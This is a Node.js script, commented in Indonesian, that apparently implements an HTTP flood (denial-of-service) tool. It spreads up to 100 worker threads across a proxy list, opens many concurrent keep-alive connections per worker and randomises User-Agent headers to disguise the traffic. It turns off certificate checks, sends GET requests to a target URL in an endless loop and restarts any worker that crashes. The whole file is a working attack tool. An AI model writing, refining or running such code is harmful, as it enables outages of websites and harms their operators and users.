// high_rps_stable.js - Stabil dengan auto-restart worker
const fs = require('fs');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// ========== KONFIGURASI ==========
const args = process.argv.slice(2);
if (args.length < 2) {
    console.log(`
Usage: node high_rps_stable.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]

Options:
  target_url              Target URL (http://... atau https://...)
  concurrent_connections  Jumlah koneksi paralel per worker
  rps_limit               Maks request per detik (0 = unlimited)
  proxy_file              File proxy (default: proxy.txt)
`);
    process.exit(1);
}

const TARGET_URL = args[0];
const CONCURRENT_PER_WORKER = parseInt(args[1], 10);
const RPS_LIMIT = args[2] ? parseInt(args[2], 10) : 0;
const PROXY_FILE = args[3] || 'proxy.txt';

let parsedTarget;
try {
    parsedTarget = new URL(TARGET_URL);
} catch (e) {
    console.error("[-] URL tidak valid:", e.message);
    process.exit(1);
}
const isHttps = parsedTarget.protocol === 'https:';

// Agent options
const AGENT_OPTIONS = {
    keepAlive: true,
    keepAliveMsecs: 1000,
    maxSockets: CONCURRENT_PER_WORKER * 2,
    maxFreeSockets: 10,
    timeout: 60000,
};

const DEFAULT_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
};

// Baca proxy
let PROXY_LIST = [];
try {
    const proxyContent = fs.readFileSync(PROXY_FILE, 'utf-8');
    PROXY_LIST = proxyContent.split('\n')
        .map(l => l.trim())
        .filter(l => l && !l.startsWith('#'));
    if (PROXY_LIST.length === 0) throw new Error('Proxy list kosong');
    console.log(`[+] Loaded ${PROXY_LIST.length} proxies dari ${PROXY_FILE}`);
} catch (err) {
    console.error(`[-] Gagal baca proxy: ${err.message}`);
    console.log('[!] Melanjutkan tanpa proxy (direct connection)');
    PROXY_LIST = [null];
}

// ========== MAIN THREAD ==========
if (isMainThread) {
    // Tangani uncaught exception di main thread
    process.on('uncaughtException', (err) => {
        console.error('[Main] Uncaught Exception:', err);
    });
    process.on('unhandledRejection', (reason, promise) => {
        console.error('[Main] Unhandled Rejection:', reason);
    });

    const totalWorkers = Math.min(PROXY_LIST.length, 100);
    console.log(`[+] Starting ${totalWorkers} workers, each with ${CONCURRENT_PER_WORKER} concurrent connections`);

    const workers = new Map(); // id -> { worker, proxy, restartCount }

    function createWorker(index, proxy) {
        const worker = new Worker(__filename, {
            workerData: {
                targetUrl: TARGET_URL,
                proxy: proxy,
                concurrent: CONCURRENT_PER_WORKER,
                rpsLimit: RPS_LIMIT > 0 ? Math.floor(RPS_LIMIT / totalWorkers) : 0,
                workerId: index,
            }
        });
        const restartCount = 0;
        workers.set(index, { worker, proxy, restartCount });

        worker.on('message', (msg) => {
            console.log(`[Worker ${index}] ${msg}`);
        });
        worker.on('error', (err) => {
            console.error(`[Worker ${index}] error event: ${err.message}`);
        });
        worker.on('exit', (code) => {
            console.error(`[Worker ${index}] exit with code ${code}`);
            if (code !== 0) {
                // Restart worker setelah 2 detik
                console.log(`[Worker ${index}] restarting in 2 seconds...`);
                setTimeout(() => {
                    const data = workers.get(index);
                    if (data) {
                        const newRestartCount = (data.restartCount || 0) + 1;
                        if (newRestartCount <= 10) {
                            console.log(`[Worker ${index}] restart attempt ${newRestartCount}`);
                            const newWorker = createWorker(index, data.proxy);
                            workers.set(index, { worker: newWorker, proxy: data.proxy, restartCount: newRestartCount });
                        } else {
                            console.error(`[Worker ${index}] too many restarts, stopping.`);
                            workers.delete(index);
                        }
                    }
                }, 2000);
            } else {
                // Normal exit, hapus dari map
                workers.delete(index);
            }
        });
        return worker;
    }

    for (let i = 0; i < totalWorkers; i++) {
        const proxy = PROXY_LIST[i % PROXY_LIST.length];
        createWorker(i, proxy);
        // Jeda startup
        setTimeout(() => {}, 100);
    }

    console.log(`[+] ${totalWorkers} workers running. Press Ctrl+C to stop.`);
    process.on('SIGINT', () => {
        console.log('\n[!] Stopping workers...');
        for (const { worker } of workers.values()) {
            worker.terminate();
        }
        process.exit(0);
    });
} else {
    // ========== WORKER THREAD ==========
    const { targetUrl, proxy, concurrent, rpsLimit, workerId } = workerData;
    
    // Tangani error di worker agar tidak mati
    process.on('uncaughtException', (err) => {
        console.error(`[Worker ${workerId}] Uncaught Exception:`, err);
        parentPort.postMessage(`CRASH: ${err.message}`);
        process.exit(1);
    });
    process.on('unhandledRejection', (reason) => {
        console.error(`[Worker ${workerId}] Unhandled Rejection:`, reason);
        parentPort.postMessage(`CRASH: ${reason}`);
        process.exit(1);
    });

    let parsedTarget;
    try {
        parsedTarget = new URL(targetUrl);
    } catch (e) {
        parentPort.postMessage(`Invalid URL: ${e.message}`);
        process.exit(1);
    }
    const isHttps = parsedTarget.protocol === 'https:';

    let agent;
    if (proxy) {
        try {
            const { HttpsProxyAgent } = require('https-proxy-agent');
            agent = new HttpsProxyAgent(proxy, AGENT_OPTIONS);
        } catch (err) {
            parentPort.postMessage(`Proxy agent error: ${err.message}`);
            process.exit(1);
        }
    } else {
        agent = isHttps ? new https.Agent(AGENT_OPTIONS) : new http.Agent(AGENT_OPTIONS);
    }

    function randomUA() {
        const chromeVer = Math.floor(Math.random() * 30) + 90;
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/537.36`;
    }

    async function doRequest() {
        const headers = {
            ...DEFAULT_HEADERS,
            'User-Agent': randomUA(),
            'Host': parsedTarget.host,
        };
        const options = {
            hostname: parsedTarget.hostname,
            port: parsedTarget.port || (isHttps ? 443 : 80),
            path: parsedTarget.pathname + parsedTarget.search,
            method: 'GET',
            headers: headers,
            agent: agent,
            timeout: 10000,
            rejectUnauthorized: false,
        };
        return new Promise((resolve) => {
            const protocol = isHttps ? https : http;
            const req = protocol.request(options, (res) => {
                res.resume();
                resolve({ status: res.statusCode, success: res.statusCode < 400 });
            });
            req.on('error', (err) => {
                resolve({ status: 0, success: false, error: err.message });
            });
            req.on('timeout', () => {
                req.destroy();
                resolve({ status: 0, success: false, error: 'timeout' });
            });
            req.end();
        });
    }

    let lastRequestTime = 0;
    const minInterval = rpsLimit > 0 ? 1000 / rpsLimit : 0;

    async function throttledRequest() {
        if (rpsLimit > 0) {
            const now = Date.now();
            const elapsed = now - lastRequestTime;
            if (elapsed < minInterval) {
                await new Promise(r => setTimeout(r, minInterval - elapsed));
            }
            lastRequestTime = Date.now();
        }
        const result = await doRequest();
        if (result.success) {
            parentPort.postMessage(`✅ ${result.status}`);
        } else {
            parentPort.postMessage(`❌ ${result.error || result.status}`);
        }
    }

    async function runWorker() {
        const promises = [];
        while (true) {
            try {
                while (promises.length < concurrent) {
                    const p = throttledRequest().finally(() => {
                        const idx = promises.indexOf(p);
                        if (idx !== -1) promises.splice(idx, 1);
                    });
                    promises.push(p);
                }
                if (promises.length >= concurrent) {
                    await Promise.race(promises);
                }
                await new Promise(r => setTimeout(r, 1));
            } catch (err) {
                parentPort.postMessage(`Loop error: ${err.message}`);
                // Jangan exit, lanjutkan loop
                await new Promise(r => setTimeout(r, 1000));
            }
        }
    }

    runWorker().catch(err => {
        parentPort.postMessage(`Fatal: ${err.message}`);
        process.exit(1);
    });
}
